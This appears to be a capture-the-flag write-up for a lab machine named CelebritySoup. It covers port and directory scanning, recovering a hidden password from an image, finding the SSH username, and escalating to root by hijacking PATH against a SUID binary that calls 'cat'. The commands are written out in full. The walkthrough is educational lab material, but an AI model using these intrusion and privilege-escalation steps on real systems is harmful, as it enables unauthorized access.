# CelebritySoup

## Port scan
```console
┌──(alienum㉿kali)-[~]
└─$ nmap 10.0.2.161 -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-04 12:51 EET
Nmap scan report for 10.0.2.161 (10.0.2.161)
Host is up (0.0026s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
## Dir scan
```console
┌──(alienum㉿kali)-[~]
└─$ dirb http://10.0.2.161                                                              

==> DIRECTORY: http://10.0.2.161/images/                                                                                                                                                                                                  
+ http://10.0.2.161/index.html (CODE:200|SIZE:2348)                                                                                                                                                                                       
==> DIRECTORY: http://10.0.2.161/js/                                                                                                                                                                                                      
+ http://10.0.2.161/robots.txt (CODE:200|SIZE:4488)                                                                                                                                                                                       
+ http://10.0.2.161/server-status (CODE:403|SIZE:275)
```

## Robots.txt
```console
┌──(alienum㉿kali)-[~]
└─$ curl http://10.0.2.161/robots.txt
----------------------------
| Governmental Departments |
----------------------------
/contract1.html
/contract2.html
/contract3.html
/contract4.html

-----------------------
| Private Departments |
-----------------------
/sector1.html
/sector2.html
/sector3.html
/sector4.html
/sector5.html
/sector6.html
/sector7.html
/sector8.html
/sector9.html
/sector10.html
```

## Zsteg
```console
┌──(alienum㉿kali)-[~]
└─$ wget http://10.0.2.161/images/master.png                                                                                      
                                                                                                                                                                                                                                         
┌──(alienum㉿kali)-[~]
└─$ zsteg master.png                  
text: "FBBFBBBFFFFFFBBBFFBFFBBFFBBFBBBBFFBFFBBBFBFFFBFBFBBFBBBFFBFFBBBBFFBFFBBBFFBFF@"
text: "bBBbBBBbbbbbbBBBbbBbbBBbbBBbBBBBbbBbbBBBbBbbbBbBbBBbBBBbbBbbBBBBbbBbbBBBbbBbb"
text: "HHHLLLLLHHHLHHLHHHHHLLLHHLLLHLLHHHLHLLLHHLLHLLLLHLLLHLLLHLLLHLLLHHLLHHLHHHLLH"
text: "0110010001101001011001110110100101110100011000010110110000101101011000100111001001100001011010010110111000101101011010010111001100101101011101000111001001100001011011100111001101100011011001010110111001100100011010010110111001100111"
```

## Binary to Ascii using perl
```console
┌──(alienum㉿kali)-[~]
└─$ echo 0110010001101001011001110110100101110100011000010110110000101101011000100111001001100001011010010110111000101101011010010111001100101101011101000111001001100001011011100111001101100011011001010110111001100100011010010110111001100111 | perl -lpe '$_=pack"B*",$_'   
Result : digital-*********************
```

## SSH attempt
#### username master (like image name) and password  the decoded binary
```console
┌──(alienum㉿kali)-[~]
└─$ ssh master@10.0.2.161    
master@10.0.2.161's password: digital-*********************
Permission denied, please try again.

```
## Searching for the username
#### creating bash script
```console
┌──(alienum㉿kali)-[~]
└─$ cat curler                                                                                                                                                                                                                         1 ⚙
#!/bin/bash
x=1
while [ $x -le 10 ]
do
  curl http://10.0.2.161/sector$x.html 2>&1 | grep "secret"
  x=$(( $x + 1 ))
done
```
#### run the script
```console
┌──(alienum㉿kali)-[~]
└─$ chmod +x curler 

┌──(alienum㉿kali)-[~]
└─$ ./curler                                                                                                                                                                                                                           1 ⚙
<div secret1="pu"></div>
<div secret2="pp"></div>
<div secret3="et"></div>
<div secret4="ma"></div>
<div secret5="st"></div>The exact location of Section 9's headquarters is held as top-secret and is only known by the Japanese government and Section 9 employees. 
<div secret6="er"></div>
```
[Username is puppetmaster and not master]
## SSH login
```console
┌──(alienum㉿kali)-[~]
└─$ ssh puppetmaster@10.0.2.161                                                                                                                                                                                                        1 ⚙
puppetmaster@10.0.2.161's password: digital-*********************
Linux CelebritySoup 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

 ______     __  __     ______     ______   ______     __    __   
/\  ___\   /\ \_\ \   /\  ___\   /\__  _\ /\  ___\   /\ "-./  \  
\ \___  \  \ \____ \  \ \___  \  \/_/\ \/ \ \  __\   \ \ \-./\ \ 
 \/\_____\  \/\_____\  \/\_____\    \ \_\  \ \_____\  \ \_\ \ \_\
  \/_____/   \/_____/   \/_____/     \/_/   \/_____/   \/_/  \/_/            
 ______     ______     ______     ______   ______     ______    
/\  ___\   /\  ___\   /\  ___\   /\__  _\ /\  __ \   /\  == \   
\ \___  \  \ \  __\   \ \ \____  \/_/\ \/ \ \ \/\ \  \ \  __<   
 \/\_____\  \ \_____\  \ \_____\    \ \_\  \ \_____\  \ \_\ \_\ 
  \/_____/   \/_____/   \/_____/     \/_/   \/_____/   \/_/ /_/ 


puppetmaster@CelebritySoup:~$ 
```
## Priv Esc
```console
puppetmaster@CelebritySoup:~$ find / -perm -u=s -type f 2>/dev/null

/home/puppetmaster/systeminfo

```
## strings
```console
puppetmaster@CelebritySoup:~$ strings /home/puppetmaster/systeminfo
/lib64/ld-linux-x86-64.so.2
setuid
puts
system
/usr/bin/whoami
/usr/bin/id
/usr/bin/hostname
cat /etc/*release
```
## Root
```console
puppetmaster@CelebritySoup:~$ cd /tmp
puppetmaster@CelebritySoup:/tmp$ echo "/bin/bash" > cat
puppetmaster@CelebritySoup:/tmp$ chmod +x cat
puppetmaster@CelebritySoup:/tmp$ export PATH=.:$PATH
puppetmaster@CelebritySoup:/tmp$ /home/puppetmaster/systeminfo
root
uid=0(root) gid=1000(puppetmaster) grupos=1000(puppetmaster),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
CelebritySoup
root@CelebritySoup:/tmp#
```
